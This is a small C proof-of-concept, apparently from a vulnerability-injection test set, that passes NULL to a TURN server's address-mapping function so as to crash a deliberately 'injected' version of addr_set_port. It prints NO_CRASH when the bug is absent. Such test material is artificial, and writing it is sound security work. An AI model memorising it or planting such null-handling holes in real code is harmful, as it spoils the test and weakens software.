// Exploit program that triggers NULL dereference in addr_set_port via map_addr_from_public_to_private
// Call chain: main -> map_addr_from_public_to_private -> addr_set_port

#include <stdio.h>
#include <stdlib.h>
#include "ns_turn_ioaddr.h"

int main() {
    ioa_addr pub;
    ioa_addr priv;
    // create a public address 127.0.0.1:54321
    if (make_ioa_addr((const uint8_t*)"127.0.0.1", 54321, &pub) < 0) {
        fprintf(stderr, "make_ioa_addr failed\n");
        return 2;
    }
    // private addr content doesn't matter
    if (make_ioa_addr((const uint8_t*)"10.0.0.1", 11111, &priv) < 0) {
        fprintf(stderr, "make_ioa_addr failed\n");
        return 2;
    }

    // add mapping so that map_addr_from_public_to_private will find a match
    ioa_addr_add_mapping(&pub, &priv);

    // Intentionally pass NULL as private_addr to trigger addr_set_port(NULL,...)
    // This should cause a NULL dereference in the injected version.
    map_addr_from_public_to_private(&pub, NULL);

    // If we reach here, exploit did not trigger
    fprintf(stderr, "NO_CRASH\n");
    return 0;
}
